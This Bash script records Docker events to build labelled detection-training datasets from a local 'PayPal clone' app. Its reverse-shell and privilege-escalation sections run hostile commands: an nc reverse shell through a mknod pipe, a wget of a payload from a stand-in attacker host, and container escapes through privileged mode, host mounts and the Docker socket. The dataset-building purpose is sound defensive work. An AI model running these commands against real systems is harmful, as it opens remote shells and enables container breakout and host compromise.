#!/bin/bash

# --- Configuration ---
# Your PayPal docker-compose network name (find with 'docker network ls')
PAYPAL_NETWORK="paypal_paypal-network" 

# Your host's IP (for the reverse shell to connect back to)
# Find this by running: ip a s | grep 'inet ' | grep -v '127.0.0.1' | head -n 1 | awk '{print $2}' | cut -d'/' -f1
HOST_IP="172.18.0.1" # !!! IMPORTANT: CHANGE THIS TO YOUR HOST IP !!!

# Number of times to run loops
LOOP_COUNT=5 
# ---------------------


# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Global PID for the logger
LOGGER_PID=""

# Function to start a logger in the background
start_logger() {
  local filter_string=$1
  local output_file=$2
  
  echo -e "${YELLOW}Starting logger for: $output_file...${NC}"
  # Start docker events, filter for the event, format as JSON, and send to the output file
  # We run this in the background (&) and save its Process ID (PID)
  docker events $filter_string --format '{{json .}}' > "$output_file" &
  
  # Save the PID of the background logger process
  LOGGER_PID=$!
  echo "Logger started with PID $LOGGER_PID."
}

# Function to stop the background logger
stop_logger() {
  if [ -n "$LOGGER_PID" ]; then
    echo -e "\n${YELLOW}Stopping logger (PID $LOGGER_PID)...${NC}"
    # Send a kill signal to the logger process
    kill "$LOGGER_PID"
    wait "$LOGGER_PID" 2>/dev/null # Wait for it to shut down
    echo -e "${GREEN}Logger stopped. Dataset file '$1' is complete.${NC}"
  else
    echo -e "${RED}Error: Logger PID not found.${NC}"
  fi
  LOGGER_PID=""
}

# --- 1. Benign Dataset ---
generate_benign() {
  echo -e "\n${BLUE}--- Generating Benign Dataset (benign_events.jsonl) ---${NC}"
  local output_file="benign_events.jsonl"
  
  # Start the logger to capture *both* 'start' and 'exec_create' events
  start_logger "--filter 'type=container' --filter 'event=exec_create' --filter 'event=start'" "$output_file"
  
  echo "Running benign admin commands (looping $LOOP_COUNT times)..."
  for i in $(seq 1 $LOOP_COUNT); do
    docker exec paypal-auth-service-1 ps aux > /dev/null
    docker exec paypal-payment-service-1 env > /dev/null
    docker exec paypal-api-gateway-1 ls -l /etc/nginx/ > /dev/null
    docker exec paypal-auth-service-1 cat /app/package.json > /dev/null
    # Simulate a simple interactive shell (very common for debugging)
    docker exec paypal-api-gateway-1 /bin/sh -c "echo 'debug shell'" > /dev/null
  done
  
  # Run a benign utility container
  echo "Running benign (non-privileged) utility container..."
  docker run --rm --network=$PAYPAL_NETWORK alpine:latest ping -c 4 paypal-auth-service > /dev/null
  
  # Give logs a moment to process
  sleep 3
  stop_logger "$output_file"
}

# --- 2. Reverse Shell Dataset ---
generate_reverse_shell() {
  echo -e "\n${RED}--- Generating Reverse Shell Dataset (reverse_shell_events.jsonl) ---${NC}"
  local output_file="reverse_shell_events.jsonl"
  
  read -p "🚨 Please run 'nc -lvp 9999' in a separate terminal. Press [Enter] when ready..."
  
  # Start the logger to capture *only* 'exec_create' events
  start_logger "--filter 'type=container' --filter 'event=exec_create'" "$output_file"
  
  echo "Running malicious reverse shell commands (looping $LOOP_COUNT times)..."
  for i in $(seq 1 $LOOP_COUNT); do
    # The 'mknod' pipe
    echo "  Running mknod reverse shell..."
    docker exec paypal-api-gateway-1 /bin/sh -c "rm /tmp/f; mknod /tmp/f p; cat /tmp/f | /bin/sh -i 2>&1 | nc $HOST_IP 9999 > /tmp/f"
    
    # Attempt to install tools
    echo "  Running 'apk add'..."
    docker exec paypal-api-gateway-1 apk add --no-cache curl
    
    # Attempt to download a payload
    echo "  Running 'wget'..."
    docker exec paypal-api-gateway-1 /bin/sh -c "wget http://evil-server.com/payload.sh -O /tmp/p"
    
    # Attempt to make it executable
    echo "  Running 'chmod'..."
    docker exec paypal-api-gateway-1 /bin/sh -c "chmod +x /tmp/p"
    sleep 1 # Short pause
  done
  
  sleep 3
  stop_logger "$output_file"
}

# --- 3. Privilege Escalation Dataset ---
generate_privilege_escalation() {
  echo -e "\n${RED}--- Generating Privilege Escalation Dataset (priv_esc_events.jsonl) ---${NC}"
  local output_file="priv_esc_events.jsonl"
  
  # Start the logger to capture *only* 'start' events
  start_logger "--filter 'type=container' --filter 'event=start'" "$output_file"
  
  echo "Running malicious privileged container commands (looping $LOOP_COUNT times)..."
  
  for i in $(seq 1 $LOOP_COUNT); do
    echo "  Running --privileged escape..."
    docker run -it --rm --privileged ubuntu:latest echo "Privileged container ran"
    
    echo "  Running host root mount escape..."
    docker run -it --rm -v /:/host_fs ubuntu:latest ls /host_fs/etc/ > /dev/null
    
    echo "  Running Docker socket mount escape..."
    docker run -it --rm -v /var/run/docker.sock:/var/run/docker.sock docker:latest docker ps > /dev/null
    
    echo "  Running host network escape..."
    docker run -it --rm --net=host alpine:latest ifconfig > /dev/null
    
    echo "  Running host PID namespace escape..."
    docker run -it --rm --pid=host alpine:latest ps aux > /dev/null
  done
  
  sleep 3
  stop_logger "$output_file"
}

# --- Main Script Logic ---
echo -e "${BLUE}PayPal Clone Dataset Generator${NC}"
echo "==============================="
echo "This script will generate 3 new JSON-Lines (.jsonl) files:"
echo "1. benign_events.jsonl"
echo "2. reverse_shell_events.jsonl"
echo "3. privilege_escalation_events.jsonl"
echo ""
echo -e "${YELLOW}Ensure your PayPal app is running: 'docker-compose up -d'${NC}"
read -p "Press [Enter] to continue..."

generate_benign
generate_reverse_shell
generate_privilege_escalation

echo -e "\n${GREEN}✅ All datasets have been generated! You can now use these .jsonl files to train your model.${NC}"
